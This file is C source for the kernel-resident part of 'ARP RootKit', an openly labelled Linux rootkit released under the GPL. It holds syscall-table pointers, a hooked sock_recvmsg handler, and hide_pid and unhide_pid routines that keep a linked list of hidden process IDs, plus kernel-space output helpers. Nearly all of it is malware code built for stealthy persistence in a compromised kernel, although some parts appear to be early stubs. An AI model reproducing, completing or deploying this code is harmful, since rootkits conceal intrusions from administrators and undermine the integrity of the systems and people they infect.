/*
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

/*
 * Only this is what will get resident in the Linux Kernel.
 *
 * IMPORTANT: If you will be hacking this, USE DELTA MACROS for non-local variables, and do not hardcode strings nor arrays (declare them global with delta macros), because they will not get relocated. 
 *
 */

#define LABEL(name) asm( \
"\t.globl\t"#name"\n" \
"\t.type\t"#name", @function\n" \
#name":\n" \
"\t.size\t"#name", .-"#name"\n" \
);

/*
 * Our Kernel begins here.
 */
LABEL(kernel_start)

#include <linux/net.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/uaccess.h>

/*
 * Macros.
 */
#define PREFIX_MAX 32
#define LOG_LINE_MAX (1024 - PREFIX_MAX)

/*
 * Types
 */
struct pid_list_node {
    pid_t nr;
    struct task_struct *task;
    struct pid_list_node *next;
};

/*
 * Function declarations.
 */
int hide_pid(pid_t pid);
int unhide_pid(pid_t pid);
int pinfo(const char *fmt, ...);
int perr(const char *fmt, ...);
int vpfd(int fd, const char *fmt, va_list args);
void pid_list_create(void);
void pid_list_destroy(void);
void pid_list_push(pid_t nr);
pid_t pid_list_pop(pid_t nr);
struct pid_list_node *pid_list_find(pid_t nr);
//void *readfile(const char *file, size_t *len);

/*
 * Global variables.
 */
void **my_ia32sct;
void **my_sct;
void **sys_call_table;
void **ia32_sys_call_table;
unsigned int *psct_fastpath;
unsigned int *psct_slowpath;
unsigned int *pia32sct;
struct pid_list_node *pid_list_head;
struct pid_list_node *pid_list_tail;
int (*tr_sock_recvmsg)(struct socket *sock, struct msghdr *msg, int flags);
void * (*f_kmalloc)(size_t size, gfp_t flags);
void (*f_kfree)(const void *);
struct pid * (*f_find_vpid)(pid_t nr);
int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args);
int (*f_sys_write)(int fd, const char *mem, size_t len);

/*
 * Hooked function handlers.
 */
int my_sock_recvmsg(struct socket *sock, struct msghdr *msg, int flags) {
    pinfo("hello from my_sock_recvmsg()!\n");
    return tr_sock_recvmsg(sock, msg, flags);
}

void pid_list_test(void) {
	size_t i;

    /*
	 * Testing pid_list
	 */
	pid_list_create();

	for (i = 1; i < 100; i++) {
		hide_pid(i);
		unhide_pid(i);
	}

	for(i = 1; i < 100; i++) {
		hide_pid(i);
	}

	for (i = 1; i < 100; i++) {
		unhide_pid(i);
	}

	for (i = 1; i < 100; i++) {
		hide_pid(i);
	}

	pid_list_destroy();
}

void kernel_test(void) {
	pinfo("hola!\n");
//	pid_list_test();
}

int hide_pid(pid_t nr) {
	struct pid *pid;
	
	pid = f_find_vpid(nr);
	if (pid) {
		if (pid_list_find(nr)) {
			perr("PID %d already hidden.\n", nr);
		} else {
			pid_list_push(nr);
			pinfo("PID %d is hidden.\n", nr);
			return 0;
		}
	} else {
		perr("PID %d not found.\n", nr);
	}

	return -1;
}

int unhide_pid(pid_t nr) {
	if (pid_list_pop(nr) == nr) {
		pinfo("PID %d unhidden.\n", nr);

		return 0;
	} else {
		perr("PID %d is not hidden.\n", nr);
	}
	
	return -1;
}

void pid_list_push(pid_t nr) {
	struct pid_list_node *node;

	node = f_kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
	if (node) {
		pid_list_tail->next = node;
		pid_list_tail = node;
		node->next = NULL;
		node->nr = nr;
	} else {
		perr("f_kmalloc() error at line %d, file %s.\n", __LINE__, __FILE__);
	}
}

struct pid_list_node *pid_list_find(pid_t nr) {
	struct pid_list_node *node;

	node = pid_list_head;
	while(node) {
        if (node->nr == nr) {
			return node;
		}
		node = node->next;
	}

	return NULL;
}

pid_t pid_list_pop(pid_t nr) {
	struct pid_list_node *node, *prev;

	prev = node = pid_list_head;
	while(node) {
		if (node->nr == nr) {
			prev->next = node->next;
			if (pid_list_tail == node) {
				pid_list_tail = prev;
			}
			f_kfree(node);

			return nr;
		}
		prev = node;
		node = node->next;
	}

	return -1;
}

void pid_list_create() {
	struct pid_list_node *node;

	node = f_kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
	node->next = NULL;
	node->nr = 0;

	pid_list_head = pid_list_tail = node;
}

void pid_list_destroy() {
	while(pid_list_head->next) {
		unhide_pid(pid_list_tail->nr);
	}

	f_kfree(pid_list_head);
}

/*
void *readfile(const char *file, size_t *len) {
	int fd;
	void *buf;
	struct stat fd_st;

	mm_segment_t old_fs = get_fs();
	set_fs(KERNEL_DS);
	fd = open(file, O_RDONLY, 0);
	if (fd >= 0) {
		newfstat(fd, &fd_st);
		buf = kmalloc(fd_st.st_size, GFP_KERNEL);
		if (buf) {
			if (read(fd, buf, fd_st.st_size) == fd_st.st_size) {
				*len = fd_st.st_size;
				close(fd);
				return buf;
			} else {
				perr("can't read lkm");
			}
		} else {
			perr("create_load_info kmalloc error");
		}

		close(fd);
	} else {
		perr("can't open lkm");
	}
	set_fs(old_fs);

	return NULL;
}
*/

int pinfo(const char *fmt, ...) {
    va_list args;
	int ret;

    va_start(args, fmt);
    ret = vpfd(1, fmt, args);
    va_end(args);
	return ret;
}

int perr(const char *fmt, ...) {
    va_list args;
    int ret;

    va_start(args, fmt);
    ret = vpfd(2, fmt, args);
    va_end(args);
    return ret;
}

int vpfd(int fd, const char *fmt, va_list args) {
    char *textbuf = NULL;
    size_t len = 0;
	mm_segment_t old_fs;

	textbuf = f_kmalloc(LOG_LINE_MAX, GFP_KERNEL);
	if (textbuf) {
		len = f_vscnprintf(textbuf, LOG_LINE_MAX, fmt, args);
	    old_fs = get_fs();
	    set_fs(KERNEL_DS);
		len = f_sys_write(fd, textbuf, len);
		f_kfree(textbuf);
		set_fs(old_fs);
		return len;
	} else {
		return -1;
	}
}

LABEL(kernel_end)
/*
 * Kernel ends here.
 *
 * IMPORTANT: DON'T add code below here. It won't get copied nor accesible.
 */
